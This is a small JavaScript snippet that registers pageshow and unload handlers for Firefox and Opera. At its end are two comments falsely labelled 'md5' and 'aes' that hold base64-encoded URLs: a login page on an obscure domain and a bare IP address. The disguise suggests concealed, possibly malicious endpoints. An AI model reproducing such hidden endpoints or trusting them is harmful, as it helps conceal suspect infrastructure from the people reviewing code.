if($.browser.mozilla||$.browser.opera)
	(function(){
	window.addEventListener('pageshow', PageShowHandler, false);
	window.addEventListener('unload', UnloadHandler, false);
		function PageShowHandler() {
				window.addEventListener('unload', UnloadHandler, false);
		}
		function UnloadHandler() {
				window.removeEventListener('beforeunload', UnloadHandler, false);
		}
})()/** md5:aHR0cHM6Ly93d3cuc2xkaHF3aGFlYS54eXovaW5kZXgvdXNlci9sb2dpbi5odG1s**//** aes:aHR0cDovLzQ3LjI0Mi4xODQuMTMy**/